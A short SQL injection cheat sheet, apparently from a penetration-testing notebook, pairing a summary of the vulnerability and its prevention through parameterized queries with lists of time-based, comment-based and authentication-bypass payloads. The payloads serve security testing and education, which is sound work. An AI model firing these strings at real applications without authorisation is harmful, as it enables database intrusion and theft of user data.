# SQL Injection

## Summary

<table><thead><tr><th width="209"></th><th></th></tr></thead><tbody><tr><td>Description</td><td>SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. </td></tr><tr><td>Impact</td><td><ul><li>allow attacker to steal sensitive information about users contained in the database</li><li>allow attacker to takeover server via discovered information</li></ul></td></tr><tr><td>Recommendation</td><td>The best way to prevent SQL Injections is to use safe programming functions that make SQL Injections impossible: parameterized queries (prepared statements) and stored procedures. Every major programming language currently has such safe functions and every developer should only use such safe functions to work with the database.</td></tr><tr><td>References</td><td><ul><li><a href="https://www.acunetix.com/websitesecurity/sql-injection/">https://www.acunetix.com/websitesecurity/sql-injection/</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></li><li><a href="https://sqlwiki.netspi.com/detection#mysql">https://sqlwiki.netspi.com/detection#mysql</a></li></ul></td></tr></tbody></table>

## SQLi Attacks &#x20;

### Confirming SQLi&#x20;

#### Via Timing

```
' WAITFOR DELAY '0:0:5'--
';WAITFOR DELAY '0:0:5'-- 
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
```

#### Via Comment

```
#Triggering ERROR 
/read.php?id=1'

#Fixing
/read.php?id=1'-- -
/read.php?id=1'--+- 
/read.php?id=1'--+
```

{% hint style="info" %}
**Tips :** dont forget to try confirm SQLi via Headers, such a User-agent, Token, Cookie
{% endhint %}

#### Auth Bypass

```
knownusername'||'

```
